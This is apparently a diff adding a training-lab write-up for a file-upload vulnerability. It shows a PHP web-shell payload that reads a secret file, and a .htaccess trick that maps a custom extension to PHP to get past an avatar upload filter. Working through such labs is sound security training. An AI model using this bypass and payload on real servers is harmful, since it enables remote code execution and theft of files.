@@ -1,0 +1,37 @@
+vulnerable path: /my-account
+vulnerable function: avatar upload function
+
+
+Analysis:
+try to upload a shell
+
+intercept the request and send it to the repeater
+
+script:
+file name: lab_4_shell.php
+->
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+<-
+
+response -> Sorry, php files are not allowed Sorry, there was an error uploading your file. <-
+
+go to the upload request in the repeater
+
+
+* Change the value of the filename parameter to .htaccess
+* Change the value of the Content-Type header to text/plain
+* Replace the contents of the file (your PHP payload) with the following Apache directive:
+AddType application/x-httpd-php .l33t
+
+send the request with these changes
+response -> The file avatars/.htaccess has been uploaded. <-
+
+now let's try to upload the php script, intercept the request and change the file extension to .l33t then forward the request
+
+response -> The file avatars/lab_4_shell.l33t has been uploaded. <-
+
+now go to /files/avatars/lab_4_shell.l33t
+
+reflected data: P66tCKPYFX5l6gfTKwOfurU8UuuKdWMU
+
+solved
